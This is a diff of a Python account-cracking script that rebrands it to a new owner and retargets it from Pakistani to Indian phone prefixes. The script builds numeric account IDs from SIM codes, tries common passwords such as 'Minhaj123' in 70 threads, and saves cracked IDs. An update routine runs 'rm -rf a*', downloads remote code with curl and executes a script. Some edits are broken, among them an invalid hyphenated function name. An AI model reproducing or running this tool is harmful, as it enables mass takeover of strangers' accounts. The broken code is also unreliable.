@@ -10,7 +10,7 @@ try:
     from requests.exceptions import ConnectionError
 except ModuleNotFoundError:
     os.system('pip install mechanize requests futures==2 > /dev/null')
-    os.system('python run.py')
+    os.system('python Mk.py')
 P = '\x1b[1;97m' # PUTIH
 M = '\x1b[1;91m' # MERAH
 H = '\x1b[1;92m' # HIJAU
@@ -1109,13 +1109,13 @@ oks = []
 cps = []
 try:
     print('\n\033[1;37m[•] WAIT CHECKING FOR UPDATE')
-    proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()
+    proxy = requests.get('https://raw.githubusercontent.com/Minhaj-Khan/Khan/main/update.txt').text.splitlines()
     v = 3.1
-    update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text
+    update = requests.get('https://raw.githubusercontent.com/Minhaj-Khan/files/main/version.txt').text
     if str(v) in update:
         os.system('rm -rf a*')
-        os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/ali.py > ali.py')
-        os.system('python ali.py')
+        os.system('curl -L https://raw.githubusercontent.com/Minhaj-Khan/ali/main/ali.py > ali.py')
+        os.system('python Mk.py')
     else:pass
 except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
 
@@ -1129,7 +1129,7 @@ def dynamic(text):
 def Minhaj_Khan():
 	os.system('clear')
 	print(logo)
-	print('[1] RANDOM PAK CLONING')
+	print('[1] RANDOM INDIA CLONING')
 	print('[2] RANDOM BD CLONING')
 	print('[3] RANDOM CHOICE PASS CLONING')
 	print('[4] CONTACT WITH OWNER')
@@ -1157,8 +1157,8 @@ def menu():
 	os.system('clear')
 	print(logo)
 	print('[1] LAST 7 DIGIT')
-	print('[2] ALI + KHAN PASS')
-	print('[3] MALIK + BALOCH PASS')
+	print('[2] Minhaj + Khan PASS')
+	print('[3] Minhaj + Khan PASS')
 	print('[4] BEST FOR PUBG IDS')
 	print('[5] BEST FOR FREE FIRE IDS')
 	print('[0] EXIT TO MAIN MENU')
@@ -1167,9 +1167,9 @@ def menu():
 	if opt =='1':
 		svn_digit()
 	elif opt =='2':
-		Minhaj_Khan_Khan()
+		Minhaj_Khan()
 	elif opt =='3':
-		malik_baloch()
+		Minhaj-Khan()
 	elif opt =='4':
 		pubg()
 	elif opt =='5':
@@ -1187,7 +1187,7 @@ def svn_digit():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[•] EXAMPLE :92318,92345,92323,92306.ETC')
+	print('[•] EXAMPLE :+91670,+91701,+91675,+91930')
 	lines()
 	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
@@ -1259,11 +1259,11 @@ def Minhaj_Khan():
 
 #_______
 
-def malik_baloch():
+def Minhaj-Khan():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
+	print('[√] EXAMPLE :91635,91930,91701,91675')
 	lines()
 	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
@@ -1280,12 +1280,12 @@ def malik_baloch():
 		tl = str(len(user))
 		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
 		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
-		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mMALIK + BALOCH')
+		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mMinhaj + KHAN')
 		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
 		lines()
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru,'malik123','malik1122','baloch786']
+			pwx = [guru,'Minhaj123','Minhaj1122','bangla786']
 			yaari.submit(fcrack,uid,pwx,tl)
 	print('[✓] Crack process has been completed')
 	print('[?] Ids saved in ok.txt,cp.txt')
@@ -1368,7 +1368,7 @@ def bd():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[•] EXAMPLE : 017,016,019,018,.')
+	print('[•] EXAMPLE : 017,016,019,018')
 	lines()
 	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
@@ -1404,7 +1404,7 @@ def chos():
     os.geteuid
     os.system("clear")
     print(logo)
-    print('\x1b[1;91m[•] YOUR SIM CODE: ')
+    print('\x1b[1;+91m[•] YOUR SIM CODE: ')
     lines()
     code = input(' Your Code : ')
     lines()
@@ -1424,10 +1424,10 @@ def chos():
     HamiiID = []
     os.system('clear')
     print(logo)
-    print('[•] EXAMPLE : khan12345,bangladesh,baloch,Etc')
+    print('[•] EXAMPLE : khan12345,bangladesh,KHAN,Etc')
     lines()
-    for bilal in range(passx):
-        pww = input(f"[•] ENTER PASSWORDS {bilal+1} : ")
+    for khan in range(passx):
+        pww = input(f"[•] ENTER PASSWORDS {khan+1} : ")
         HamiiID.append(pww)
     with ThreadPool(max_workers=70) as manshera:
         os.system('clear')
